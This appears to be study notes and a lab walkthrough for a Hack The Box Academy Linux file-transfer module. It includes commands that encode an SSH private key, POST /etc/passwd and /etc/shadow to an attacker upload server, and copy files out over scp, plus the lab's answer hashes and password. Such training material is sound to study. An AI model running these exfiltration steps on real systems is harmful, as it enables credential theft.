# Download Operations

## Base64 Encode/Decode

```sh title="Check file md5 hash"
md5sum id_rsa
```

```sh title="Encode file to Base64"
cat id_rsa | base64 -w 0;echo
```

## Web Downloads with Wget and cURL

### Download using Wget

Uppercase `-O` flag

```sh
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
```

### Download using cURL

Lowercase `-o` flag

```sh
curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
```

## Download with Bash (/dev/tcp)

When no well-known file transfer tools are available, we can use **Bash** as long as the version is `2.04` or above. We can use the built-in `/dev/tcp`

### Connect to Target Webserver

```sh
exec 3<>/dev/tcp/IP_HERE/PORT
```

### HTTP GET Request

```sh
echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
```

### Print the Response

```sh
cat <&3
```

## SSH Downloads

### Downloading Files using SCP

```sh
scp plaintext@192.X.X.X:/root/myroot.txt .
```

---

# Upload Operations

## Web Uploads

We can configure Python `uploadserver` package to use **HTTPS**

### Create Self-Signed Certificate

```sh
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
```

### Starting the Webserver

```sh
sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
```

### Upload Multiple Files

```sh
curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
```

## Alternative Web File Transfer Method

```python title="Creating Web Server with Python3"
python3 -m http.server
```

```python title="Creating Web Server with Python2.7"
python2.7 -m SimpleHTTPServer
```

```php title="Creating Web Server with PHP"
php -s 0.0.0.0:8080
```

```ruby title="Creating Web Server with Ruby"
ruby -run -ehttpd . -p8000
```

## SCP Upload

```sh
scp /etc/passwd htb-student@10.129.86.90:/home/htb-student/
```

Target: 
10.129.234.168


Download the file flag.txt from the web root using Python from the Pwnbox. Submit the contents of the file as your answer.
        5d21cf3da9c0ccb94f709e2559f3ea50

┌─[leviathan@parrot]─[~]
└──╼ $wget http://10.129.234.168/flag.txt
--2026-05-31 22:10:13--  http://10.129.234.168/flag.txt
Connecting to 10.129.234.168:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 33 [text/plain]
Saving to: ‘flag.txt’

flag.txt                100%[=============================>]      33  --.-KB/s    in 0s      

2026-05-31 22:10:13 (1.39 MB/s) - ‘flag.txt’ saved [33/33]

┌─[leviathan@parrot]─[~]
└──╼ $cat flag.txt 
5d21cf3da9c0ccb94f709e2559f3ea50


Upload the attached file named upload_nix.zip to the target using the method of your choice. Once uploaded, SSH to the box, extract the file, and run "hasher <extracted file>" from the command line. Submit the generated hash as your answer.
SSH to with user "htb-student" and password "HTB_@cademy_stdnt!" 
        159cfe5c65054bbadb2761cfa359c8b0

##Unzip file and send via scp 
┌─[✗]─[leviathan@parrot]─[~]
└──╼ $scp ~/Downloads/upload_nix.txt htb-student@10.129.234.168:/home/htb-student/
htb-student@10.129.234.168's password: 
upload_nix.txt                                              100%   32     0.4KB/s   00:00    
##SSH to Target
┌─[leviathan@parrot]─[~]
└──╼ $ssh htb-student@10.129.234.168
htb-student@10.129.234.168's password: 
Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-47-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon 01 Jun 2026 05:18:17 AM UTC

  System load:             0.1
  Usage of /:              29.5% of 15.68GB
  Memory usage:            10%
  Swap usage:              0%
  Processes:               145
  Users logged in:         0
  IPv4 address for ens192: 10.129.234.168
  IPv6 address for ens192: dead:beef::a0de:adff:fe3b:c3dc


71 updates can be installed immediately.
0 of these updates are security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Wed Sep  9 22:42:43 2020 from 10.10.14.4
##Use hasher on file
htb-student@nix04:~$ hasher upload_nix.txt 
159cfe5c65054bbadb2761cfa359c8b0
htb-student@nix04:~$ 


Optional: Connect to the target machine via SSH and practice various file transfer operations (upload and download) with your attack host (workstation). Type "DONE" when finished.








